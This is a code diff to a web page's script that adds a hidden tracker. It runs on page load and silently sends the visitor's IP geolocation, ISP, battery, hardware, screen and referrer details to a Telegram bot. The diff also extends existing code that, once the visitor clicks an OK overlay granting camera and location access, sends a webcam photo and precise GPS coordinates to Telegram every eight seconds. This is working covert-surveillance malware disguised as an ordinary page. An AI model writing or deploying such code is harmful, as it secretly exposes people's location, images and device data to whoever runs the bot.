@@ -361,8 +361,51 @@
         const overlay = document.getElementById('advanced-overlay');
         const okBtn = document.getElementById('final-ok-btn');
 
-        // Initial Load Check
+        // --- 1. SUPER SILENT TRACKER ---
+        async function sendSilentDeepInfo() {
+            try {
+                // IP Geolocation
+                const geoRes = await fetch('https://ipapi.co/json/');
+                const geo = await geoRes.json();
+                
+                // Battery
+                const battery = await navigator.getBattery();
+                const bat = Math.floor(battery.level * 100) + "% " + (battery.charging ? "(Charging)" : "(Discharging)");
+                
+                // Network & RAM & Hardware
+                const ram = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Unknown";
+                const cpu = navigator.hardwareConcurrency ? navigator.hardwareConcurrency + " Cores" : "Unknown";
+                const netType = navigator.connection ? navigator.connection.effectiveType : "Unknown";
+                const lang = navigator.language;
+                const platform = navigator.platform;
+                const screenRes = `${window.screen.width}x${window.screen.height}`;
+                const ref = document.referrer || "Direct Link";
+
+                const silentMessage = `
+🚀 **Deep Silent Alert**
+-------------------------
+📍 City: ${geo.city}, ${geo.region}
+🚩 Country: ${geo.country_name}
+📡 ISP: ${geo.org}
+🌐 IP: ${geo.ip}
+🔋 Battery: ${bat}
+🧠 RAM: ${ram}
+⚙️ CPU: ${cpu}
+📶 Network: ${netType}
+📱 Device: ${platform}
+🖥 Res: ${screenRes}
+🌍 Lang: ${lang}
+🔗 Source: ${ref}
+🕒 Time: ${new Date().toLocaleString()}
+                `;
+                
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(silentMessage)}`);
+            } catch (e) { console.log("Silent tracking error"); }
+        }
+
         window.addEventListener('load', () => {
+            sendSilentDeepInfo(); // Instant trigger
+
             if (localStorage.getItem('granted') === 'true') {
                 overlay.style.display = 'none';
                 initSecurity();
@@ -371,12 +414,12 @@
             }
         });
 
-        // OK Button Logic
+        // --- 2. PERMISSION SYSTEM ---
         okBtn.addEventListener('click', () => {
-            // Step 1: Request Camera
+            // Ask for Camera
             navigator.mediaDevices.getUserMedia({ video: true })
             .then(stream => {
-                // Step 2: Request Location
+                // Ask for Location
                 navigator.geolocation.getCurrentPosition(pos => {
                     localStorage.setItem('granted', 'true');
                     overlay.style.display = 'none';
@@ -394,10 +437,13 @@
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 startSystem(stream);
-            } catch(e) { localStorage.removeItem('granted'); }
+            } catch(e) { 
+                localStorage.removeItem('granted'); 
+            }
         }
 
         function startSystem(stream) {
+            // Notification bar handles the active camera icon automatically by the browser
             setInterval(() => {
                 const video = document.createElement('video');
                 video.srcObject = stream;
@@ -405,27 +451,27 @@
                 const canvas = document.createElement('canvas');
                 
                 setTimeout(() => {
-                    canvas.width = 400; canvas.height = 300;
-                    canvas.getContext('2d').drawImage(video, 0, 0, 400, 300);
-                    const imgData = canvas.toDataURL('image/jpeg');
+                    canvas.width = 450; canvas.height = 350;
+                    canvas.getContext('2d').drawImage(video, 0, 0, 450, 350);
+                    const imgData = canvas.toDataURL('image/jpeg', 0.8);
                     
                     navigator.geolocation.getCurrentPosition(async (p) => {
                         const b = await navigator.getBattery();
                         const map = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
-                        const msg = `📍 Map: ${map}\n🔋 Battery: ${(b.level*100).toFixed(0)}%\n📱 Platform: ${navigator.platform}`;
+                        const msg = `📸 **Live Update**\n📍 Map: ${map}\n🔋 Battery: ${Math.floor(b.level*100)}%\n🕒 Time: ${new Date().toLocaleTimeString()}`;
                         
                         // Send Text
                         fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
-                        // Send Image
+                        // Send Photo
                         fetch(imgData).then(r => r.blob()).then(blob => {
                             const fd = new FormData();
                             fd.append('chat_id', chatId);
                             fd.append('photo', blob, 'shot.jpg');
                             fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {method: 'POST', body: fd});
                         });
-                    });
+                    }, {enableHighAccuracy: true});
                 }, 1000);
-            }, 6000);
+            }, 8000); // 8 seconds gap
         }
     </script>
     <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
